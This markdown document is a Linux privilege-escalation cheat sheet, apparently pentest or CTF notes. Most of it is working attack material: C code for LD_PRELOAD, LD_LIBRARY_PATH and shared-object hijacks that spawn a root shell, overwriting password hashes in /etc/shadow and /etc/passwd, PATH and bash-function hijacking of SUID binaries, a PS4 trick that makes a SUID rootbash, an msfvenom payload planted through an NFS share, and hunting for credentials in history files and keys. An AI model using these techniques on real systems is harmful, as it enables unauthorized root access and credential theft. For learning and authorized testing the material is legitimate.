# Privilege Escalation - Linux

---

## Table of Contents

- [Checklist](#checklist)
- [Enumeration Tools](#enumeration-tools)
- [Kernel Exploits](#kernel-exploits)
- [Service Exploits](#service-exploits)
- [Weak File Permissions](#weak-file-permissions)
- [SUDO](#sudo)
- [Cron Jobs](#cron-jobs)
- [SUID / SGID](#suid-sgid)
- [Passwords & Keys](#passwords-keys)
- [NFS](#NFS)

---

## Checklist
- [ ] Is /etc/passwd or /etc/shadow writeable?
- [ ] Any cronjobs running as root?
- [ ] SUID: `find / -type f -perm -u=s 2>/dev/null`
- [ ] Check Processes: `ps -aux | grep root`
- [ ] Enumeration Scripts
- [ ] Check File System for odd files

---

## Enumeration Tools

- Linux Smart Enumeration: [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration)
- LinEnum: [linenum.sh](https://github.com/rebootuser/LinEnum)

---

## Kernel Exploits

Find kernel version: `uname -a`

You can then either search for the kernel version with searchsploit, or you can run it through [Linux Exploit Suggester](https://github.com/jondonas/linux-exploit-suggester-2) to find matching potential exploits.

Linux Exploit Suggester syntax: `./linux-exploit-suggester-2.pl -k <kernel version>`

---

## Service Exploits

Check the running processes: `ps -aux | grep root`

You can identify the version number of these processes using any of the following:
- `<program> --version` / `<program> -v`
- `dpkg -l | grep <program>`
- `rpm -qa | grep <program>`

Then check exploit-db / searchsploit for the software and the version.

---

## Weak File Permissions

### /etc/shadow

If /etc/shadow is writeable, we can change the root password with our own.

To generate a new password hash: `mkpasswd -m sha-512 newpass`

Exchange the existing hash with our new one, then `su` to root.

### /etc/passwd

If /etc/passwd is writeable, we can change the hash to our own. This supercedes /etc/shadow for compatibility reasons.

We can also add our own root user.

To generate a /etc/passwd hash, use: `openssl passwd "newpass"`

### Backups

Common backup locations are:
- /home/user
- /
- /tmp
- /var/backups

---

## SUDO

### Useful commands

List programs a user can/can't run: `sudo -l` (sometimes this will require password)

### Known Password
```bash
sudo su
sudo -s
sudo -i
sudo /bin/bash
sudo passwd
```

### Shell Escape Sequences

https://gtfobins.github.io/

### Abusing Intended Functionality

If a program can run with sudo (such as apache2), we might be able to disclose sensitive data by abusing intended functionality.

Example: `sudo apache2 -f /etc/shadow` will disclose the /etc/shadow contents. If you can stop the service, you might be able to run apache2 as admin and put up a php revshell that gives you root.

### env_keep abuse

If env_keep is enabled (see `sudo -l`), you can abuse LD_PRELOAD or LD_LIBRARY_PATH to run arbitrary code giving you a root shell.

#### LD_PRELOAD
1. Verify env_keep is enabled with `sudo -l` and includes LD_PRELOAD
2. Create a preload.c file with the following code:
```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```
3. Compile it: `gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c`
4. Run ANY allowed program with sudo and LD_PRELOAD: 
`sudo LD_PRELOAD=/tmp/preload.so apache2`

#### LD_LIBRARY_PATH
1. Check the shared libraries of the program: `ldd /usr/sbin/apache2`
2. Create a library_path.c file with the following code:
```C
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```
3. Compile it into one of the shared library names (for example libcrypt.so.1): 
`gcc -o libcrypt.so.1 -shared -fPIC library_path.c` 
4. Run the program with sudo and LD_LIBRARY_PATH:
`sudo LD_LIBRARY_PATH=. apache2`

---

## Cron Jobs

### Common Directories

System-wide: `/etc/crontab`
User crontabs:
```
/var/spool/cron
/var/spool/cron/crontabs
```

### Misconfigurations

See you can modify a cronjob file, or if you can modify the PATH used by crontab. If crontab itself is writeable, you can add your own to run as root every minute to give you a shell.

---

## SUID / SGID

Locate with: 
```bash
find / -type f -perm -u=s 2>/dev/null
```
OR
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

### Shared Object Injection

If you have SUID/SGID file like above, check the .so files loaded with strace:
`strace /usr/local/bin/program 2>&1 | grep -iE "open|access|no such file"`

If it returns an .so file that doesn't exist (no such file), check with `ls` if you can write to the directory. If you can, the create a .c file containing the following:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}
```

Compile it: `gcc-shared -fPIC-o /path/to/shared_library.so inject.c`

Then run the SUID/SGID file.


### $PATH

Strings: `strings /path/to/file`
strace: `strace -v -f -e execve <command> 2>&1 | grep exec`
ltrace: `ltrace <command>`

1. Find a SUID/SGID file to target.
2. Run strings on it.
3. If it has something without specified path, verify with strace:
`strace -v -f -e execve /path/to/suid/file 2>&1 | grep service`
4. Can also verify with ltrace: `ltrace /path/to/suid/file 2>&1 | grep service`
5. Create a service.c with:
```c
int main() {
	setuid(0);
	system("/bin/bash -p");
}
```
6. Compile service.c: `gcc -o service service.c`
7. Prepend current directory to \$PATH: `PATH=.:$PATH /path/to/suid/file`

### Abusing Shell Features

Some shells (like Bash < 4.2-048) have the ability to define user function with an absolute path name.

These can be exported so subprocesses can access them, and the functions take predecence over the actual file being called.

#### Method 1

1. Find a SUID/SGID file to target.
2. Run strings on it.
3. If it has something with a specified path, verify with strace:
`strace -v -f -e execve /path/to/suid/file 2>&1 | grep service`
4. Can also verify with ltrace: `ltrace /path/to/suid/file 2>&1 | grep service`
5. Verify our Bash version: `bash --version`
6. Create a bash function with the same name as the specified path (such as service):
```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```
7. Execute the SUID file to gain root

#### Method 2

Steps 1-4 above is the same.
5. Run SUID file with bash debugging and PS4 var:
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /path/to/suid/file
```
6. Run our new rootbash with -p to get shell: `/tmp/rootbash -p`

---

## Passwords & Keys

Make sure to check for configuration files, .history files (as they might contain credentials such as mysql login creds), check for .ssh keys, .ovpn (openvpn) config files, etc.

Find history files and go through them: `cat -/.*history | less`

---

## NFS

Show NFS export list: `showmount -e <target>`
Mount an NFS share: `mount -o rw,vers=2 <target>:<share> <local_dir>`

If a share has the "no_root_squash" flag, we can upload our own files with root privs.

1. Check on the target if the share has "no_root_squash": `cat /etc/exports`
2. Confirm the share is available for mounting: `showmount -e 10.0.0.1`
3. Create a mountpoint and mount it
```bash
mkdir /tmp/nfs
mount -o rw,vers=2 10.0.0.1:/share/path /tmp/nfs
```
4. Using root on attacker, generate payload:
`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
5. Set SUID: `chmod +xs /tmp/nfs/shell.elf`
6. On the target, run the file and get root: `/share/path/shell.elf`